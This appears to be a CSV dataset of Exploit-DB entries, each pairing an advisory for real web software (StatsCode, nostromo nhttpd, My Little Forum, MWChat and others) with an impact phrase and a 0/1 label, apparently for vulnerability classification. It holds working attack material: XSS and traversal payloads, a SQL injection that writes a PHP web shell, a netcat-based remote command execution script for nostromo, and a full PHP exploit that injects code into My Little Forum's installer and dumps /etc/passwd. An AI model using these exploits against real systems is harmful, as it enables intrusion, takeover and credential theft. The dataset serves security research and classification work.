34805,StatsCode - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/43693/info  StatsCode is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   Login : &#039;><script>alert(&#039;xss&#039;)</script> Password : &#039;><script>alert(&#039;xss&#039;)</script>,execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site,1
25791,"Rakkarsoft RakNet 2.33 - Remote Denial of Service source: https://www.securityfocus.com/bid/13862/info  Rakkarsoft RakNet is affected by a remote denial of service vulnerability.  Reportedly, the vulnerability presents itself when the library handles an empty UDP packet.  RakNet 2.33 and prior versions released before May 30, 2005 are affected by this vulnerability. Various games employing the affected library may be vulnerable as well.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/25791.zip",denial of service,1
35466,"nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution source: https://www.securityfocus.com/bid/46880/info  nostromo nhttpd is prone to a remote command-execution vulnerability because it fails to properly validate user-supplied data.  An attacker can exploit this issue to access arbitrary files and execute arbitrary commands with application-level privileges.  nostromo versions prior to 1.9.4 are affected.  #!/bin/sh ###################################### #                                    # #  RedTeam Pentesting GmbH           # #  kontakt@redteam-pentesting.de     # #  http://www.redteam-pentesting.de  # #                                    # ######################################  if [ $# -lt 3 ]; then     echo ""Usage: $(basename $0) HOST PORT COMMAND...""     exit 2 fi   HOST=""$1"" PORT=""$2"" shift 2  ( \     echo -n -e 'POST /..%2f..%2f..%2fbin/sh HTTP/1.0\r\n'; \     echo -n -e 'Content-Length: 1\r\n\r\necho\necho\n'; \     echo ""$@ 2>&1"" \ ) | nc ""$HOST"" ""$PORT"" \   | sed --quiet --expression ':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'",command-execution,1
32405,"xt:Commerce 3.04 - 'advanced_search_result.php?keywords' Cross-Site Scripting source: https://www.securityfocus.com/bid/31313/info  xt:Commerce is prone to multiple vulnerabilities, including a session-fixation vulnerability and a cross-site scripting vulnerability.  An attacker can leverage the session-fixation issue to hijack a session of an unsuspecting user. The attacker can exploit the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  xt:Commerce 3.04 is vulnerable; other versions may also be affected.  https://www.example.com/advanced_search_result.php?keywords=/>""<script>alert(15)</script>&x=1&y=1",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
40020,"Panda Security (Multiple Products) - Local Privilege Escalation # Exploit Title: Panda Security Privilege Escalation # Date: 27/6/2016 # Exploit Author: Security-Assessment.com # Vendor Homepage: http://www.pandasecurity.com # Version: Panda Global Protection 2016 (16.1.2),Panda Antivirus Pro 2016 (16.1.2),Panda Small Business Protection (16.1.2),Panda Internet Security 2016 (16.1.2) # Tested on: Windows 10  Panda Security – Privilege Escalation  (    , )     (,   .   '.' ) ('.    ',    ). , ('.   ( ) (   (_,) .'), ) _ _,  /  _____/  / _  \    ____  ____   _____  \____  \==/ /_\  \ _/ ___\/  _ \ /     \  /       \/   |    \\  \__(  <_> )  Y Y  \ /______  /\___|__  / \___  >____/|__|_|  /         \/         \/.-.    \/         \/:wq                     (x.0)                   '=.|w|.='                   _=''""''=.  		presents.. Panda Security - Privilege Escalation Affected Software - 	Panda Global Protection 2016 (16.1.2) 	Panda Antivirus Pro 2016 (16.1.2) 	Panda Small Business Protection (16.1.2) 	Panda Internet Security 2016 (16.1.2) Testing Environment - Windows 10 PDF: http://www.security-assessment.com/files/documents/advisory/Panda%20Security%20-%20Privilege%20Escalation.pdf  +-------------+ | Description | +-------------+ Multiple Panda Security products are vulnerable to local privilege escalation. As the USERS group has write permissions over the folder where the PSEvents.exe process is located, it is possible to execute malicious code as Local System.  +--------------+ | Exploitation | +--------------+ “PSEvents.exe” is scheduled to be executed every hour with SYSTEM Privileges. When executed, it tries to locate a number of DLLs in its local directory to be loaded. However, some of these DLLs don’t exist.   The DACLs of the directory that contains the “PSEvents.exe” executable allow a user in the USERS group to create files in that directory. A malicious user can exploit this vulnerability by creating a malicious DLL file in that directory and name it as one of the missing DLLs. After one hour, the “PSEvents.exe” process will start and load our malicious DLL  The same method can be used to exploit other executables (PSDevice.exe and PSProfiler.exe) located in Panda’s Downloads directory.   +----------+ | Solution | +----------+ Install Panda’s Hotfix for this vulnerability. http://www.pandasecurity.com/uk/support/card?id=100053  +----------+ | Timeline | +----------+ 10/5/2016 - Exchange PGP 11/5/2016 - Advisory sent to Panda Security 14/5/2016 - Confirm receipt of the advisory 23/5/2016 - Email Panda Security for update 01/6/2016 - Panda Security reply that they have a fix in development. 16/6/2016 - Panda Security send hotfix to verify if it fixes the vulnerability. 21/6/2016 - Panda Security schedule to release the hotfix on 24/6/2016 24/6/2016 - Hotfix released 27/6/2016 - Advisory released   +-------------------------------+ | About Security-Assessment.com | +-------------------------------+ Security-Assessment.com is a leading team of Information Security consultants specialising in providing high quality Information Security services to clients throughout the Asia Pacific region. Our clients include some of the largest globally recognised companies in areas such as finance, telecommunications, broadcasting, legal and government. Our aim is to provide the very best independent advice and a high level of technical expertise while creating long and lasting professional relationships with our clients.  Security-Assessment.com is committed to security research and development, and its team continues to identify and responsibly publish vulnerabilities in public and private software vendor's products. Members of the Security-Assessment.com R&D team are globally recognised through their release of whitepapers and presentations related to new security research.  For further information on this issue or any of our service offerings, contact us:  Web www.security-assessment.com Email info () security-assessment.com Phone +64 4 470 1650",Privilege Escalation,1
29049,BlogTorrent Preview 0.92 - 'Announce.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/21125/info  BlogTorrent Preview is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks  BlogTorrent Preview 0.92 and prior versions are vulnerable to this issue.  http://www.example.com/announce.php?left=[xss],have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site,1
6544,"WebPortal CMS 0.7.4 - 'code' Remote Code Execution WebPortal <= 0.7.4 (code) Remote Code Execution Vulnerability Download : http://webportal.ivanoculmine.com/download.php?mid=14 Vuln : ######################################################################         <?         if ($_GET[""action""] == ""execute"") {           eval (stripslashes($_POST[""code""]));         }         ?> ###################################################################### POC : /index.php?m=admin&f=console&action=execute&code=(id);} passthru(id); ######################################################################  # milw0rm.com [2008-09-23]",Code Execution,1
40021,"My Little Forum 2.3.5 - PHP Command Injection /* [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/MYLITTLEFORUM-PHP-CMD-EXECUTION.txt  [+] ISR: APPARITIONSEC   Vendor: ================= mylittleforum.net  Download: github.com/ilosuna/mylittleforum/releases/tag/v2.3.5   Product: =================== MyLittleForum 2.3.5  my little forum is a simple PHP and MySQL based internet forum that displays the messages in classical threaded view (tree structure). The main claim of this web forum is simplicity. Furthermore it should be easy to install and run on a standard server configuration with PHP and MySQL.   Vulnerability Type: ======================= PHP Command Execution   CVE Reference: ============== N/A   Vulnerability Details: =====================  When setting up mylittleforum CMS users will have to walk thru an installation script and provide details for the application like the forums email address, name, admin email, admin password, database name etc...  However, no input validation / checks exists for that installation script. Low privileged users can then supply arbitrary PHP code for the Database Name. The PHP command values will get written to the config/db_settings.php file and processed by the application. Since we supply an invalid Database Name a MySQL error will be thrown but the injected PHP payload will also be executed on the host system.  If the CMS is installed by low privileged user and that user has basic MySQL database authorization to run the install for the CMS it can result in a privilege escalation, remote command execution and complete takeover of the host server.  The /config/db_settings.php is protected by .htaccess file but we can write directly to ""db_settings.php"" file and execute code directly from /install/index.php file bypassing any access control provided by the .htaccess file or we just delete it by adding call to PHP function @unlink('.htaccess') to our injected PHP payload.   1) Browse to http://localhost/mylittleforum-2.3.5/install/index.php   2) For Database Name input field enter the below PHP code for POC. ';?><?php echo passthru('/bin/cat /etc/passwd');'  This results in config/db_settings.php file being injected with our arbitrary PHP code. $db_settings['database'] = '';?><?php echo passthru('/bin/cat /etc/passwd');'';   3) Make another HTTP GET request to same page ""/install/index.php"" file and done!... we access /etc/passwd system file.   HTTP/1.1 200 OK Date: Fri, 24 Jun 2016 03:01:13 GMT Server: Apache/2.4.12 (Unix) OpenSSL/1.0.1m PHP/5.6.8 mod_perl/2.0.8-dev Perl/v5.16.3 X-Powered-By: PHP/5.6.8 Connection: close Transfer-Encoding: chunked Content-Type: text/html; charset=utf-8  root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin  etc...   Exploit code(s): ===============  1) Download and unpack mylittleforum-2.3.5 upload to web server (Linux), chmod -R 777 etc... 2) Run below PHP script from Command line from remote work station 3) BOOM we can now read Linux ""/etc/passwd"" file on remote server */  <?php #mylittleforum-2.3.5 PHP CMD Execution Exploit #by hyp3rlinx #ISR: apparitionsec #hyp3rlinx.altervista.org #cat Linux system file '/etc/passwd' POC #tested RH Linux 5 #=======================================================  if($argc<5){ echo ""myLittleForum CMS PHP Command Execution Exploit\r\n""; echo ""Usage: <IP>,<MySQL-USER>,<MySQL-PASSWD>,<ROOT DIR>\r\n""; echo ""================= by hyp3rlinx ===================\r\n""; exit(); }  $port=80;                   #Default port $victim=$argv[1];           #IP $user=$argv[2];             #MySQL username $pwd=$argv[3];              #MySQL password $root_dir=$argv[4];         #/mylittleforum-2.3.5 $uri=""/install/index.php"";  #PHP CMD inject entry point  $s = fsockopen($victim, $port, $errno, $errstr, 10); if(!$s){echo ""Cant connect to the server!""; exit();}  $CMD_INJECTTION=""forum_name=PWN"".                ""&forum_address=http://$victim/$root_dir/"". ""&forum_email=x@x.com"". ""&admin_name=$user"". ""&admin_email=x@x.com"". ""&admin_pw=$pwd"". ""&admin_pw_conf=$pwd"". ""&host=localhost"". ""&database=';?><?php echo passthru('/bin/cat /etc/passwd');'"". ""&user=$user"". ""&password=$pwd"". ""&table_prefix=mlf2_"". ""&install_submit=OK+-+Install+forum"". ""&language_file=english.lang"";      #Inject commands     $out = ""POST /$root_dir/$uri HTTP/1.1\r\n"";     $out .= ""Host: $victim\r\n"";     $out .= ""Content-Type: application/x-www-form-urlencoded\r\n"";     $out .= 'Content-Length: ' . strlen($CMD_INJECTTION) . ""\r\n"";     $out .= ""Connection: close\r\n\r\n"";     fwrite($s, $out);     fwrite($s, $CMD_INJECTTION);     fclose($s);     sleep(2);      #Second HTTP request to read Linux /etc/passwd file in the response     $out="""";     $s = fsockopen($victim, $port, $errno, $errstr, 10);     $out = ""GET /$root_dir/$uri HTTP/1.1\r\n"";     $out .= ""Host: $victim\r\n"";     $out .= ""Connection: Close\r\n\r\n"";     fwrite($s, $out);      $r='';       while (!feof($s)) {          $r=fgets($s, 128);          echo $r;         if(strpos($r,'<!DOCTYPE')!==FALSE){            break;          }        } fclose($s); ?>  /* Disclosure Timeline: ================================= Vendor Notification: No Reply June 27, 2016 : Public Disclosure   Exploitation Technique: ======================= Remote   Severity Level: =========================================== (High) 8.7 CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N   [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere.  hyp3rlinx */",Command Execution,1
30531,AutoIndex PHP Script 2.2.1 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/25448/info  AutoIndex PHP Script is prone a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  AutoIndex PHP Script 2.2.1 is vulnerable; other versions may also be affected.   http://www.example.com/AutoIndex/index.php?search=asdf&search_mode=[xss],execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
23209,"mutant penguin mpweb pro 1.1.2 - Directory Traversal source: https://www.securityfocus.com/bid/8745/info  It has been reported that MPWeb PRO may be prone to a directory traversal vulnerability that may allow an attacker to traverse outside the server root directory by using '/./../' character sequences. The issue is caused by insufficient sanitization of user-supplied input.  This vulnerability may be successfully exploited to gain sensitive information about a vulnerable host that could be used to launch further attacks against the system.  MPWeb PRO version 1.1.2 has been reported to be affected by this issue, however other versions may be vulnerable as well.   http://www.example.com/./../mpweb.ini http://www.example.com/./.././.././../winnt/repair/sam",traverse outside the server root directory,1
7537,"BLOG 1.55B - 'image_upload.php' Arbitrary File Upload ################## Piker ####################################### # # #    BLOG v1.55B Arbitrary File Upload Vulnerability #  # #    Affected software: BLOG v1.55B prior versions can be affected  #    Vendor: http://sourceforge.net/projects/kafooeyblog/ #    Risk: High # ################################################################  #  #    http://[target]/[path]/lib/image_upload.php # #   This script only checks if the file you are uploading #   is not a text/plain file so you can upload whatever #   you want, for example a PHP Shell. #  #    ################################################################ # #         Found by Piker [piker0x90(at)gmail(dot)com] # #            D.O.M Labs - Security Researchers #                   www.domlabs.org  # # ################################################################  # milw0rm.com [2008-12-21]",information disclosure,1
26394,"MWChat 6.8 - 'chat.php' SQL Injection source: https://www.securityfocus.com/bid/15198/info  MWChat is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/mwchat/chat.php?Username='UNION%20SELECT%200,0,0,0,'<?system($_GET[cmd]);?>',0,0,0%20INTO%20OUTFILE%20'../../www/mwchat/shell.php'%20FROM%20chat_text/*&Sequence_Check=&Lang=en&Resolution=1280&Room=prova",exploit vulnerabilities in the underlying database implementation,1
34091,"Pay Per Minute Video Chat Script 2.x - SQL Injection / Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/40585/info  Pay Per Minute Video Chat Script is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Cross-site scripting:  http://www.example.com/P47H/admin/memberviewdetails.php?id=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(666)%3B%3C/ScRiPt%3E   http://www.example.com/P47H/videos.php?model=%3E%22%3E%3CScRiPt%20%0a%0d%3Ealert(666)%3B%3C/ScRiPt%3E   SQL-injection:  http://www.example.com/P47H/index_ie.php?page=-666",fails to sufficiently sanitize user-supplied input,1
32611,"CodeToad ASP Shopping Cart Script - Cross-Site Scripting source: https://www.securityfocus.com/bid/32568/info  CodeToad ASP Shopping Cart Script is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/?>""'><ScRiPt>alert(1369)</ScRiPt>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
31498,Quick Classifieds 1.0 - 'controlpannel/createdb.php3?DOCUMENT_ROOT' Remote File Inclusion source: https://www.securityfocus.com/bid/28417/info                     Quick Classifieds is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.                     Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.                     Quick Classifieds 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/QuickSystems_path/controlpannel/createdb.php3?DOCUMENT_ROOT=ZoRLu.txt?,fails to sufficiently sanitize user-supplied data,0
4945,"bloofox 0.3 - SQL Injection / File Disclosure ########################## WwW.BugReport.ir ######################### # #      AmnPardaz Security Research Team # # Title:Bloofox CMS Vulnerabilities # Vendor: http://www.bloofox.com # Bugs: SQL Injection (Authentication bypass) , Source code disclosure # Vulnerable Version: 0.3 (prior versions also may be affected) # Exploitation: Remote with browser # Fix Available: No! ################################################################   #################### - Description: ####################  BloofoxCMS is a free open source content management system (CMS).   #################### - Vulnerability: ####################  +-->SQL Injection (authentication bypass)  Code Snippet: index.php Line#107-116  if(isset($_POST['login']) || $_GET['login'] == ""true"") { 	if($perm->login($db,$_POST['username'],$_POST['password']) == 1) { 		$login_ok = 1; 		if($_GET['login'] == ""true"") { 			load_url(""index.php""); 		} 	} else { 		$login_failed = 1; 	} }  system/class_permissions.php Line#63-68 	function login($db,$user,$pass) 	{ 		global $tbl_prefix; 		$pass = md5($pass); 		$db->query(""SELECT uid,username,password,groups FROM "".$tbl_prefix.""sys_user WHERE username = '"".$user.""' && password = '"".$pass.""' && blocked = '0' && deleted = '0' && status = '1' ORDER BY username""); 		$total = $db->num_rows(); 		. 		. 		.   There is no input validation here therefore its possible for a remote attacker to bypass login mechanism when magic quotes is disabled!  POC : Username: admin' or 1=1 /* Password: something  +--> Source code disclosure  Code Snippet: file.php Line#25-49  $file = $_GET['file'];  // Block external linkings $HTTP_REFERER = $_SERVER['HTTP_REFERER']; if(strpos($HTTP_REFERER,$_SERVER['SERVER_NAME']) == 0) { 	die(""Forget It!""); }  $basedir = getcwd().""/media/files"";  // create file name $filename = sprintf(""%s/%s"", $basedir, $file);  // check file on server if(!file_exists($filename)) { 	die(""File not found!""); }  header(""Content-Type: application/octet-stream"");  $save_as_name = basename($file); header(""Content-Disposition: attachment; filename=\"""".$save_as_name.""\"""");  // output readfile($filename);  Input passed to the ""file"" parameter is not properly sanitised before being used. This can be exploited to display arbitrary files through directory traversal attacks or by passing full paths.  POC: GET: http://servername/bloofoxCMS_0.3/file.php?file=../../system/class_mysql.php Referer: http://servername/  #################### - Credit : #################### Original advisory: http://bugreport.ir/?/27 AmnPardaz Security Research Team Contact: admin[4t}bugreport{d0t]ir WwW.BugReport.ir WwW.AmnPardaz.com  # milw0rm.com [2008-01-20]",bypass login mechanism when magic quotes is disabled,1
31492,Quick Classifieds 1.0 - 'controlpannel/alterCats.php3?DOCUMENT_ROOT' Remote File Inclusion source: https://www.securityfocus.com/bid/28417/info               Quick Classifieds is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.               Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.               Quick Classifieds 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/QuickSystems_path/controlpannel/alterCats.php3?DOCUMENT_ROOT=ZoRLu.txt?,fails to sufficiently sanitize user-supplied data,0
20882,"faust Informatics FreeStyle chat 4.1 sr2 - Directory Traversal source: https://www.securityfocus.com/bid/2776/info  Freestyle Chat server from Faust Informatics incorporates interactive chat functionality into websites.  Versions of Freestyle Chat are vulnerable to directory traversal attacks. This can allow a remote user to request files from outside the normal webserver directory scope.  Properly exploited, this could provide information useful in further attacks on the vulnerable host.   http://www.example.com/.../.../scandisk.log",request files from outside the normal webserver directory scope,1
24722,TIPS MailPost 5.1.1 - Error Message Cross-Site Scripting source: https://www.securityfocus.com/bid/11598/info  MailPost is reported prone to a cross-site scripting vulnerability. This issue presents itself due to insufficient sanitization of user-supplied data and can allow an attacker to execute arbitrary HTML and script code in a user's browser through a malicious error message returned from the application.   This attack would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.   MailPost 5.1.1sv is reported prone to this issue. It is possible that other versions are affected as well.  http://www.example.com/scripts/mailpost.exe/<script>alert('hi')</script>/mail.txt,execute arbitrary HTML and script code in a user's browser through a malicious error message returned from the application,1
